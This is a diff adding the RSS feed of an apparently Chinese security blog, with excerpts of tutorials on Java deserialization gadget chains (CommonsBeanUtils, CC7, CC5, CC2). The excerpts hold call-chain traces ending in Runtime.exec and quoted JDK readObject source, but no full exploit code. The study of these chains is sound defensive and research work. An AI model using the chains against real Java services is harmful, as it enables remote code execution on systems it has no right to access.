@@ -1,0 +1,490 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>反序列化专题 on S0lowalker</title><link>https://s0lowalker.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E9%A2%98/</link><description>Recent content in 反序列化专题 on S0lowalker</description><generator>Hugo</generator><language>zh-cn</language><lastBuildDate>Thu, 21 May 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://s0lowalker.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E9%A2%98/index.xml" rel="self" type="application/rss+xml"/><item><title>java反序列化之CB</title><link>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcb/</link><pubDate>Thu, 21 May 2026 00:00:00 +0000</pubDate><guid>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcb/</guid><description>&lt;h1 id="java反序列化之cb"&gt;
+ java反序列化之CB
+ &lt;a class="anchor" href="#java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcb"&gt;#&lt;/a&gt;
+&lt;/h1&gt;
+&lt;h2 id="commonsbeanutils-简介"&gt;
+ CommonsBeanUtils 简介
+ &lt;a class="anchor" href="#commonsbeanutils-%e7%ae%80%e4%bb%8b"&gt;#&lt;/a&gt;
+&lt;/h2&gt;
+&lt;p&gt;Apache Commons 工具集下除了 &lt;code&gt;collections&lt;/code&gt; 以外还有 &lt;code&gt;BeanUtils&lt;/code&gt; ，它主要用于操控 &lt;code&gt;JavaBean&lt;/code&gt; 。&lt;/p&gt;
+&lt;p&gt;先说说什么是 JavaBean。&lt;/p&gt;
+&lt;p&gt;一般 JavaBean 的格式就是&lt;code&gt;private&lt;/code&gt;的字段和对字段进行读写操作的&lt;code&gt;public&lt;/code&gt;方法，最常见的就是&lt;code&gt;getter&lt;/code&gt;和&lt;code&gt;setter&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;CommonsBeanUtils 这个包也可以操作 JavaBean，例如：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Baby&lt;/span&gt; { 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;private&lt;/span&gt; String name &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;abc&amp;#34;&lt;/span&gt;; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; String &lt;span style="color:#a6e22e"&gt;getName&lt;/span&gt;(){ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; name; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	} 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;void&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;setName&lt;/span&gt; (String name) { 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;this&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;name&lt;/span&gt; &lt;span style="color:#f92672"&gt;=&lt;/span&gt; name; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	} 
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里定义了两个简单的&lt;code&gt;getter&lt;/code&gt;和&lt;code&gt;setter&lt;/code&gt;，如果用&lt;code&gt;@Lombok&lt;/code&gt;的注解也是一样的，使用 &lt;code&gt;@Lombok&lt;/code&gt; 的注解不需要写 &lt;code&gt;getter&lt;/code&gt;和&lt;code&gt;setter&lt;/code&gt;。例如：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@Data&lt;/span&gt; &lt;span style="color:#75715e"&gt;// 或者 @Getter @Setter&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;User&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;private&lt;/span&gt; String name;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;private&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; age;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// 不需要写 getter/setter，Lombok 会在编译时自动生成&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Commons-BeanUtils 中提供了一个静态方法 &lt;code&gt;PropertyUtils.getProperty&lt;/code&gt;，让使用者可以直接调用任意 JavaBean 的 &lt;code&gt;getter&lt;/code&gt; 方法，示例如下：&lt;/p&gt;</description></item><item><title>java反序列化之CC7</title><link>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc7/</link><pubDate>Wed, 20 May 2026 00:00:00 +0000</pubDate><guid>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc7/</guid><description>&lt;h1 id="java反序列化之cc7"&gt;
+ java反序列化之CC7
+ &lt;a class="anchor" href="#java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcc7"&gt;#&lt;/a&gt;
+&lt;/h1&gt;
+&lt;h2 id="cc7-链分析"&gt;
+ CC7 链分析
+ &lt;a class="anchor" href="#cc7-%e9%93%be%e5%88%86%e6%9e%90"&gt;#&lt;/a&gt;
+&lt;/h2&gt;
+&lt;p&gt;CC7 的后半段链子和 CC1 是一样的，前半段先看一下 yso 的链子：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;java.util.Hashtable.readObject
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;java.util.Hashtable.reconstitutionPut
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;org.apache.commons.collections.map.AbstractMapDecorator.equals
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;java.util.AbstractMap.equals
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;org.apache.commons.collections.map.LazyMap.get
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;org.apache.commons.collections.functors.ChainedTransformer.transform
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;org.apache.commons.collections.functors.InvokerTransformer.transform
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;java.lang.reflect.Method.invoke
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sun.reflect.DelegatingMethodAccessorImpl.invoke
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sun.reflect.NativeMethodAccessorImpl.invoke
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sun.reflect.NativeMethodAccessorImpl.invoke0
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;java.lang.Runtime.exec
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;入口类是&lt;code&gt;Hashtable&lt;/code&gt;，看一下&lt;code&gt;readObject&lt;/code&gt;方法的源码：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;private&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;void&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;readObject&lt;/span&gt;(java.&lt;span style="color:#a6e22e"&gt;io&lt;/span&gt;.&lt;span style="color:#a6e22e"&gt;ObjectInputStream&lt;/span&gt; s)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;throws&lt;/span&gt; IOException, ClassNotFoundException
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// Read in the length, threshold, and loadfactor&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; s.&lt;span style="color:#a6e22e"&gt;defaultReadObject&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// Read the original length of the array and number of elements&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; origlength &lt;span style="color:#f92672"&gt;=&lt;/span&gt; s.&lt;span style="color:#a6e22e"&gt;readInt&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; elements &lt;span style="color:#f92672"&gt;=&lt;/span&gt; s.&lt;span style="color:#a6e22e"&gt;readInt&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// Compute new size with a bit of room 5% to grow but&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// no larger than the original size. Make the length&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// odd if it&amp;#39;s large enough, this helps distribute the entries.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// Guard against the length ending up zero, that&amp;#39;s not valid.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;int&lt;/span&gt; length &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (&lt;span style="color:#66d9ef"&gt;int&lt;/span&gt;)(elements &lt;span style="color:#f92672"&gt;*&lt;/span&gt; loadFactor) &lt;span style="color:#f92672"&gt;+&lt;/span&gt; (elements &lt;span style="color:#f92672"&gt;/&lt;/span&gt; 20) &lt;span style="color:#f92672"&gt;+&lt;/span&gt; 3;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (length &lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; elements &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; (length &lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt; 1) &lt;span style="color:#f92672"&gt;==&lt;/span&gt; 0)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; length&lt;span style="color:#f92672"&gt;--&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (origlength &lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; 0 &lt;span style="color:#f92672"&gt;&amp;amp;&amp;amp;&lt;/span&gt; length &lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; origlength)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; length &lt;span style="color:#f92672"&gt;=&lt;/span&gt; origlength;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; table &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;new&lt;/span&gt; Entry&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;,&lt;span style="color:#f92672"&gt;?&amp;gt;[&lt;/span&gt;length&lt;span style="color:#f92672"&gt;]&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; threshold &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (&lt;span style="color:#66d9ef"&gt;int&lt;/span&gt;)Math.&lt;span style="color:#a6e22e"&gt;min&lt;/span&gt;(length &lt;span style="color:#f92672"&gt;*&lt;/span&gt; loadFactor, MAX_ARRAY_SIZE &lt;span style="color:#f92672"&gt;+&lt;/span&gt; 1);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; count &lt;span style="color:#f92672"&gt;=&lt;/span&gt; 0;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// Read the number of elements and then all the key/value objects&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; (; elements &lt;span style="color:#f92672"&gt;&amp;gt;&lt;/span&gt; 0; elements&lt;span style="color:#f92672"&gt;--&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;@SuppressWarnings&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;unchecked&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; K key &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (K)s.&lt;span style="color:#a6e22e"&gt;readObject&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;@SuppressWarnings&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;unchecked&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; V value &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (V)s.&lt;span style="color:#a6e22e"&gt;readObject&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#75715e"&gt;// synch could be eliminated for performance&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; reconstitutionPut(table, key, value);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在最后调用了&lt;code&gt;Hashtable.reconstitutionPut()&lt;/code&gt;方法，跟进一下：&lt;/p&gt;</description></item><item><title>java反序列化之CC5</title><link>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc5/</link><pubDate>Tue, 19 May 2026 00:00:00 +0000</pubDate><guid>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc5/</guid><description>&lt;h1 id="java反序列化之cc5"&gt;
+ java反序列化之CC5
+ &lt;a class="anchor" href="#java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcc5"&gt;#&lt;/a&gt;
+&lt;/h1&gt;
+&lt;h2 id="cc5-链分析"&gt;
+ CC5 链分析
+ &lt;a class="anchor" href="#cc5-%e9%93%be%e5%88%86%e6%9e%90"&gt;#&lt;/a&gt;
+&lt;/h2&gt;
+&lt;p&gt;先看一下 yso 给的 CC5 链子：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-text" data-lang="text"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ObjectInputStream.readObject()
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -&amp;gt; BadAttributeValueExpException.readObject()
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -&amp;gt; TiedMapEntry.toString()
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -&amp;gt; TiedMapEntry.getValue()
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -&amp;gt; LazyMap.get()
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -&amp;gt; ChainedTransformer.transform()
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -&amp;gt; InvokerTransformer.transform() (反射调用)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -&amp;gt; Runtime.exec()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;入口类是&lt;code&gt;BadAttributeValueExpException&lt;/code&gt;的&lt;code&gt;readObject()&lt;/code&gt;方法，反序列化漏洞的起点一般都是&lt;code&gt;readObject&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;toString()&lt;/code&gt;方法实在太多，就从头开始分析。&lt;/p&gt;
+&lt;p&gt;首先是&lt;code&gt;BadAttributeValueExpException&lt;/code&gt;类的&lt;code&gt;readObject&lt;/code&gt;方法：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-java" data-lang="java"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;private&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;void&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;readObject&lt;/span&gt;(ObjectInputStream ois) &lt;span style="color:#66d9ef"&gt;throws&lt;/span&gt; IOException, ClassNotFoundException {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ObjectInputStream.&lt;span style="color:#a6e22e"&gt;GetField&lt;/span&gt; gf &lt;span style="color:#f92672"&gt;=&lt;/span&gt; ois.&lt;span style="color:#a6e22e"&gt;readFields&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; Object valObj &lt;span style="color:#f92672"&gt;=&lt;/span&gt; gf.&lt;span style="color:#a6e22e"&gt;get&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;val&amp;#34;&lt;/span&gt;, &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (valObj &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; val &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (valObj &lt;span style="color:#66d9ef"&gt;instanceof&lt;/span&gt; String) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; val&lt;span style="color:#f92672"&gt;=&lt;/span&gt; valObj;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; (System.&lt;span style="color:#a6e22e"&gt;getSecurityManager&lt;/span&gt;() &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;||&lt;/span&gt; valObj &lt;span style="color:#66d9ef"&gt;instanceof&lt;/span&gt; Long
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;||&lt;/span&gt; valObj &lt;span style="color:#66d9ef"&gt;instanceof&lt;/span&gt; Integer
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;||&lt;/span&gt; valObj &lt;span style="color:#66d9ef"&gt;instanceof&lt;/span&gt; Float
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;||&lt;/span&gt; valObj &lt;span style="color:#66d9ef"&gt;instanceof&lt;/span&gt; Double
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;||&lt;/span&gt; valObj &lt;span style="color:#66d9ef"&gt;instanceof&lt;/span&gt; Byte
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;||&lt;/span&gt; valObj &lt;span style="color:#66d9ef"&gt;instanceof&lt;/span&gt; Short
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;||&lt;/span&gt; valObj &lt;span style="color:#66d9ef"&gt;instanceof&lt;/span&gt; Boolean) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; val &lt;span style="color:#f92672"&gt;=&lt;/span&gt; valObj.&lt;span style="color:#a6e22e"&gt;toString&lt;/span&gt;(); &lt;span style="color:#75715e"&gt;//这里是调用链的一环&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; { &lt;span style="color:#75715e"&gt;// the serialized object is from a version without JDK-8019292 fix&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; val &lt;span style="color:#f92672"&gt;=&lt;/span&gt; System.&lt;span style="color:#a6e22e"&gt;identityHashCode&lt;/span&gt;(valObj) &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;@&amp;#34;&lt;/span&gt; &lt;span style="color:#f92672"&gt;+&lt;/span&gt; valObj.&lt;span style="color:#a6e22e"&gt;getClass&lt;/span&gt;().&lt;span style="color:#a6e22e"&gt;getName&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里就调用了&lt;code&gt;toString()&lt;/code&gt;方法，根据 yso 的链子，接下来是&lt;code&gt;TiedMapEntry&lt;/code&gt;类的&lt;code&gt;toString()&lt;/code&gt;方法：&lt;/p&gt;</description></item><item><title>java反序列化之CC2</title><link>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc2/</link><pubDate>Mon, 18 May 2026 00:00:00 +0000</pubDate><guid>https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc2/</guid><description>&lt;h1 id="java反序列化之cc2"&gt;
+ java反序列化之CC2
+ &lt;a class="anchor" href="#java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcc2"&gt;#&lt;/a&gt;
+&lt;/h1&gt;
+&lt;h2 id="cc2-链分析"&gt;
+ CC2 链分析
+ &lt;a class="anchor" href="#cc2-%e9%93%be%e5%88%86%e6%9e%90"&gt;#&lt;/a&gt;
+&lt;/h2&gt;
+&lt;p&gt;CC2 这条链子是在 CC4 的基础上修改了一部分，主要是为了避免使用&lt;code&gt;Transformer&lt;/code&gt;数组。&lt;/p&gt;
+&lt;p&gt;在 CC4 的基础上，抛弃了用&lt;code&gt;InstantiateTransformer&lt;/code&gt;类将&lt;code&gt;TrAXFilter&lt;/code&gt;初始化，以及 &lt;code&gt;TemplatesImpl.newTransformer()&lt;/code&gt; 这个步骤。&lt;/p&gt;
+&lt;p&gt;CC2 的前半部分，还是和&lt;code&gt;compare()&lt;/code&gt;方法相关，最后是&lt;code&gt;TemplatesImpl&lt;/code&gt;动态加载字节码，和 CC4 最后部分是一样的。而难点就在&lt;code&gt;InvokerTransformer&lt;/code&gt;的连接。&lt;/p&gt;
+&lt;h2 id="exp-编写"&gt;
+ EXP 编写
+ &lt;a class="anchor" href="#exp-%e7%bc%96%e5%86%99"&gt;#&lt;/a&gt;
+&lt;/h2&gt;
+&lt;p&gt;先回顾一下调用链：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
